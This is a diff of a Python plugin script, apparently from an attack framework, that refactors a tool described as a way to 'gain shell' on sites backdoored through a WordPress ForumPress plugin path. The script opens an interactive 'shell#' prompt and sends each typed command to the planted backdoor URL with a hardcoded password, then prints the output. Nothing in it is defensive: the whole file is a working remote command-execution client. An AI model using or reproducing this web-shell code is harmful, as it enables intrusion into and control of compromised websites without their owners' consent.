@@ -2,9 +2,12 @@ Description = 'SingleBlows partner once backdoored gain shell'
 from plugin_support import *
 import requests, time
 
-def main():
+init = {
+	'target':ask.target
+}
+def run():
+	global init
 	try:
-		before_execute()
 		text("Connecting to target")
 		time.sleep(2)
 		text("Generating direct shell")
@@ -12,7 +15,7 @@ def main():
 		print ""
 		while True:
 			cmd = raw_input("shell# ")
-			target = "http://" + ask.target + "/wp-content/plugins/ForumPress/forum_press.php?passwd=qgAZ9xWxTsmGX5mgnbTHyzdf5oSbwzRhVB4LL7d29RSb4MqXRdbSWEoCvaTn&c=" + cmd
+			target = "http://" + init['target'] + "/wp-content/plugins/ForumPress/forum_press.php?passwd=qgAZ9xWxTsmGX5mgnbTHyzdf5oSbwzRhVB4LL7d29RSb4MqXRdbSWEoCvaTn&c=" + cmd
 			if cmd == "exit":
 				exit()
 			else:
@@ -20,4 +23,3 @@ def main():
 				print r.content
 	except KeyboardInterrupt:
 		exit()
-main()
